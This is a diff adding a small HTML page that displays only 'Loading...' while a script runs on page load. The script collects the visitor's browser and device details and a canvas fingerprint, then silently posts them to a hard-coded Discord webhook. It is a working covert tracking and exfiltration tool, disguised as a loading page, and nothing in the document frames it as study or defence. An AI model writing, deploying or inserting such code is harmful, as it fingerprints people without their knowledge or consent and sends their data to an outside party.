@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>fprint</title>
+</head>
+<body>
+    <p>Loading...</p>
+
+    <script>
+        async function collectAndSend() {
+            const webhookUrl = "https://discord.com/api/webhooks/1539601613889609738/ATL6V8Xl-BPAeKG5rOSoJNcvvFfJuY1CXuwbRrdx8xJwPmGWqAOCdMackVsQn790ZHgp";
+
+            const data = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillText("Browser Fingerprint, 🮫", 2, 2);
+                data.canvasHash = canvas.toDataURL().slice(-50);
+            } catch (e) {
+                data.canvasHash = "blocked";
+            }
+
+            const payload = {
+                content: "XYZ **New Device Data Collected:**\n```json\n" + JSON.stringify(data, null, 2) + "\n```"
+            };
+
+ 
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Failed to send webhook", err);
+            }
+        }
+
+        collectAndSend();
+    </script>
+</body>
+</html>
